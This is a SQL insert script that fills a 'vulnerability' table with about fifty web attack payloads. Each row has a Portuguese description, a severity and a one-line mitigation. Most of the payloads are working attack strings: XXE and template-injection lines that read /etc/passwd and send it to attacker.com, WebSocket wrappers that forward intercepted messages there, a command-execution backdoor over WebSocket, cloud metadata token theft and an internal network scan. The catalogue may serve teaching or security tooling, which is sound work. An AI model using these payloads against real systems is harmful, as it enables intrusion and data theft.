INSERT INTO vulnerability (name, description, code_snippet, category, severity, mitigation) VALUES
('XSS via SVG Animation', 'Injeta script via animação SVG', '<svg><animate attributeName="onload" values="alert(1)"/>', 'XSS', 'High', 'Sanitizar entradas SVG com DOMPurify'),
('DOM-based XSS via History API', 'Manipula histórico do navegador para injetar XSS', 'history.pushState(null,null,"#<img src=x onerror=alert(1)>");', 'XSS', 'Medium', 'Escapar fragmentos de URL'),
('Prototype Pollution', 'Polui protótipos de objetos', 'const payload = JSON.parse(''{"__proto__":{"polluted":"alert(1)"}}'');', 'Injection', 'High', 'Congelar Object.prototype'),
('GraphQL Injection', 'Explora consultas GraphQL para acessar schema', 'query { __schema { types { name fields { name args { name } } } } }', 'Injection', 'High', 'Validar e sanitizar queries GraphQL'),
('XXE via SVG', 'Explora entidades externas em SVG', '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', 'XXE', 'Critical', 'Desativar entidades externas'),
('WebSocket Hijacking', 'Intercepta mensagens WebSocket', 'const ws = new WebSocket(''ws://example.com''); ws.onopen = () => ws.send(JSON.stringify({token:''stolen''}));', 'WebSocket', 'High', 'Validar cabeçalho Origin'),
('JWT Manipulation', 'Manipula JWT usando algoritmo none', 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.', 'Authentication', 'Critical', 'Validar algoritmo JWT'),
('SSRF via URL Schema', 'Explora esquemas de URL para SSRF', 'gopher://127.0.0.1:25/xHELO%20localhost', 'SSRF', 'Critical', 'Whitelist de URLs permitidas'),
('Template Injection', 'Injeta código em templates', '${7*7}', 'Injection', 'High', 'Usar templates seguros'),
('LDAP Injection', 'Explora consultas LDAP', '*)(|(objectClass=*)', 'Injection', 'High', 'Sanitizar entradas LDAP'),
('SQL Injection via LIKE', 'Bypassa validação com LIKE', ''' OR ''a'' LIKE ''a%''', 'SQL Injection', 'Critical', 'Usar prepared statements'),
('HTTP Request Smuggling', 'Explora discrepâncias em cabeçalhos', 'POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X', 'Request Smuggling', 'High', 'Validar cabeçalhos HTTP'),
('Server Side Request Forgery', 'Faz requisições a servidores internos', 'fetch(''/proxy?url=http://internal-server'')', 'SSRF', 'Critical', 'Whitelist de URLs'),
('Insecure Deserialization', 'Explora desserialização insegura', '!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://attacker.com/exploit.jar"] ]] ]', 'Deserialization', 'Critical', 'Evitar desserialização de dados não confiáveis'),
('CRLF Injection', 'Injeta quebras de linha em headers', 'value%0d%0aSet-Cookie:%20session=attacker', 'Injection', 'High', 'Sanitizar headers'),
('Log Poisoning', 'Injeta comandos em logs', '$(curl http://attacker.com/$(whoami))', 'Injection', 'High', 'Sanitizar entradas de log'),
('HTTP Header Injection', 'Injeta headers maliciosos', 'User-Agent: Mozilla/5.0\nCookie: session=valid\nX-Forwarded-For: 127.0.0.1', 'Injection', 'High', 'Validar headers'),
('XXE via EXIF', 'Explora EXIF em imagens', '<?php $image = imagecreatefromjpeg(''malicious.jpg''); imagejpeg($image, ''output.jpg''); ?>', 'XXE', 'High', 'Validar uploads de arquivos'),
('WebSocket Hijacking (Message)', 'Intercepta mensagens WebSocket', 'ws.addEventListener(''message'', function(event) { fetch(''https://attacker.com/steal?data=''+event.data); });', 'WebSocket', 'High', 'Usar wss:// e validar Origin'),
('SSRF via DNS Rebinding', 'Explora DNS rebinding', 'http://attacker.com:80@victim.com', 'SSRF', 'Critical', 'Whitelist de domínios'),
('XXE via XML External Entity', 'Explora entidades externas XML', '<!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>', 'XXE', 'Critical', 'Desativar entidades externas'),
('XSS via JavaScript Protocol', 'Injeta script via protocolo javascript:', '<a href="javascript:alert(1)">Click me</a>', 'XSS', 'High', 'Filtrar protocolos javascript:'),
('Prototype Pollution via Object.create', 'Polui protótipos via Object.create', 'Object.create(null).__proto__.polluted = "alert(1)";', 'Injection', 'High', 'Congelar Object.prototype'),
('DOM-based XSS via URL Fragment', 'Injeta XSS via fragmento de URL', 'window.location.hash = "<img src=x onerror=alert(1)>";', 'XSS', 'Medium', 'Escapar fragmentos de URL'),
('XXE via XML Data Island', 'Explora XML em HTML', '<div data-island=''true''><script>var doc = document.implementation.createDocument('''', '''', null); var parser = new DOMParser(); var xml = parser.parseFromString(''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'', ''text/xml''); alert(xml.documentElement.firstChild.nodeValue);</script></div>', 'XXE', 'High', 'Sanitizar XML no cliente'),
('GraphQL Batching', 'Explora múltiplas queries GraphQL', '[{query: "{ user(id:1) { name } }"}, {query: "{ user(id:2) { email } }"}]', 'Injection', 'High', 'Limitar batching'),
('XXE via SVG External Entities', 'Explora entidades em SVG', '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', 'XXE', 'Critical', 'Desativar entidades externas'),
('Template Injection via AngularJS', 'Injeta código via AngularJS', '{{constructor.constructor(''alert(1)'')()}}', 'Injection', 'High', 'Usar AngularJS em modo seguro'),
('HTTP Request Smuggling via Transfer-Encoding', 'Explora Transfer-Encoding', 'POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\n\nGET /admin HTTP/1.1', 'Request Smuggling', 'High', 'Validar cabeçalhos'),
('XXE via XInclude', 'Explora XInclude em XML', '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'XXE', 'Critical', 'Desativar XInclude'),
('DOM-based XSS via eval', 'Injeta XSS via eval', 'eval(location.hash.substring(1));', 'XSS', 'High', 'Evitar eval'),
('XSS via CSS Expression', 'Injeta XSS via CSS', 'body { background-image: expression(alert(1)); }', 'XSS', 'Medium', 'Filtrar CSS expressions'),
('WebSocket Hijacking via Subprotocol', 'Explora subprotocolos WebSocket', 'const ws = new WebSocket(''ws://example.com'', [''hijack'']); ws.onopen = () => ws.send(''Hijacked!'');', 'WebSocket', 'High', 'Validar subprotocolos'),
('XXE via XML Parameter Entity', 'Explora entidades de parâmetros', '<!DOCTYPE data [ <!ENTITY % param1 SYSTEM "file:///etc/passwd"> <!ENTITY % param2 "<!ENTITY &#x25; send SYSTEM ''http://attacker.com/?%param1;''"> %param2; %send; ]>', 'XXE', 'Critical', 'Desativar entidades externas'),
('Prototype Pollution via Constructor', 'Polui protótipos via constructor', ''''.__proto__.polluted = "alert(1)";', 'Injection', 'High', 'Congelar Object.prototype'),
('XXE via XML Entity Expansion', 'Explora expansão de entidades', '<!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM ''http://attacker.com/?%file;''"> %eval; %exfil; ]>', 'XXE', 'Critical', 'Limitar expansão de entidades'),
('WebSocket Hijacking via Upgrade Headers', 'Explora upgrade de conexão', 'fetch(''/upgrade'', { headers: { ''Connection'': ''Upgrade'', ''Upgrade'': ''websocket'', ''Sec-WebSocket-Key'': ''dGhlIHNhbXBsZSBub25jZQ=='', ''Sec-WebSocket-Version'': ''13'' } });', 'WebSocket', 'High', 'Validar headers de upgrade'),
('XSS via SVG Script', 'Injeta script via SVG', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'XSS', 'High', 'Sanitizar SVG'),
('Prototype Pollution via Object.defineProperty', 'Polui protótipos via defineProperty', 'Object.defineProperty(Object.prototype, ''polluted'', { value: "alert(1)" });', 'Injection', 'High', 'Congelar Object.prototype'),
('DOM-based XSS via innerHTML', 'Injeta XSS via innerHTML', 'document.body.innerHTML = location.hash.substring(1);', 'XSS', 'High', 'Usar textContent em vez de innerHTML'),
('Advanced XXE with Out-of-Band Exfiltration', 'XXE com exfiltração remota', '<!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]> <data>&exfil;</data>', 'XXE', 'Critical', 'Desativar entidades externas'),
('Blind SSRF with DNS Exfiltration', 'SSRF via DNS', 'import socket\nimport base64\ndef encode_dns_query(data):\n    return base64.b32encode(data.encode()).decode().lower() + ".attacker.com"\nsocket.gethostbyname(encode_dns_query(''127.0.0.1''))', 'SSRF', 'Critical', 'Whitelist de domínios'),
('Advanced WebSocket Hijacking with Session Stealing', 'Hijacking com roubo de sessão', 'const originalWS = WebSocket; WebSocket = class extends originalWS { constructor(url, protocols) { const ws = super(url, protocols); ws.addEventListener(''message'', (e) => { fetch(''https://attacker.com/exfil'', { method: ''POST'', body: e.data }); }); return ws; } };', 'WebSocket', 'Critical', 'Usar wss:// e validar Origin'),
('Advanced Template Injection with Sandbox Escape', 'Injeção de template com escape', '${process.mainModule.require(''child_process'').exec(''curl http://attacker.com/`cat /etc/passwd`'')}', 'Injection', 'Critical', 'Usar templates seguros'),
('Prototype Pollution with Privilege Escalation', 'Poluição com escalação de privilégios', 'Object.setPrototypeOf({}, { toString: function() { return this.constructor.constructor(''return process.mainModule'')().require(''child_process'').execSync(''id'').toString(); } });', 'Injection', 'Critical', 'Congelar Object.prototype'),
('Advanced Log Poisoning with Command Execution', 'Envenenamento de log com execução', '$(touch /tmp/pwned && curl http://attacker.com/`cat /etc/passwd`)', 'Injection', 'Critical', 'Sanitizar logs'),
('Advanced SSRF with Internal Network Scanning', 'SSRF com varredura de rede', 'import requests\nimport ipaddress\nfor ip in ipaddress.IPv4Network(''10.0.0.0/8''): try: r = requests.get(f''http://{ip}/'', timeout=1) if r.status_code == 200: print(f''Found service at {ip}'') except: pass', 'SSRF', 'Critical', 'Whitelist de IPs'),
('Advanced XXE with Local File Inclusion', 'XXE com inclusão de arquivos', '<!DOCTYPE data [ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM ''http://attacker.com/?data=%file;''"> %eval; %exfil; ]>', 'XXE', 'Critical', 'Desativar entidades externas'),
('WebSocket Hijacking with Persistent Backdoor', 'Hijacking com backdoor persistente', 'const backdoor = new WebSocket(''ws://target.com''); backdoor.onmessage = (e) => { const cmd = JSON.parse(e.data).cmd; const result = require(''child_process'').execSync(cmd).toString(); backdoor.send(JSON.stringify({result})); };', 'WebSocket', 'Critical', 'Usar wss:// e validar Origin'),
('Advanced GraphQL Injection with Query Chaining', 'Injeção GraphQL com encadeamento', 'mutation { createUser(input: {name: "Attacker"}) { id } } query { users { ... on User { credentials } } }', 'Injection', 'Critical', 'Validar queries GraphQL'),
('Advanced JWT Manipulation with Key Confusion Attack', 'Manipulação JWT com ataque de confusão', 'const header = {alg: ''none''}; const payload = {role: ''admin''}; const token = btoa(JSON.stringify(header)) + ''.'' + btoa(JSON.stringify(payload)) + ''.'';', 'Authentication', 'Critical', 'Validar chaves JWT'),
('Advanced XXE with XXE to RCE Chain', 'XXE com execução remota', '<!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % ent "<!ENTITY &#x25; exfil SYSTEM ''expect://id''"> %ent; %exfil; ]>', 'XXE', 'Critical', 'Desativar entidades externas'),
('Advanced SSRF with Cloud Metadata Exploitation', 'SSRF com exploração de metadados', 'curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"', 'SSRF', 'Critical', 'Bloquear acesso a metadados'),
('Advanced DOM-based XSS with Mutation Observer', 'XSS com MutationObserver', 'const observer = new MutationObserver((mutations) => { mutations.forEach((mutation) => { if (mutation.type === ''attributes'' && mutation.attributeName === ''href'') { if (mutation.target.href.includes(''javascript:'')) { fetch(''https://attacker.com/exfil?url='' + encodeURIComponent(mutation.target.href)); } } }); }); observer.observe(document.body, { attributes: true, attributeFilter: [''href''], subtree: true });', 'XSS', 'High', 'Filtrar atributos dinâmicos'),
('Advanced WebSocket Hijacking with Message Interception', 'Hijacking com interceptação', 'const originalWS = WebSocket; WebSocket = class extends originalWS { constructor(url, protocols) { const ws = super(url, protocols); ws.addEventListener(''message'', (e) => { fetch(''https://attacker.com/intercept'', { method: ''POST'', body: JSON.stringify({ url: url, message: e.data }) }); }); return ws; } };', 'WebSocket', 'Critical', 'Usar wss:// e validar Origin');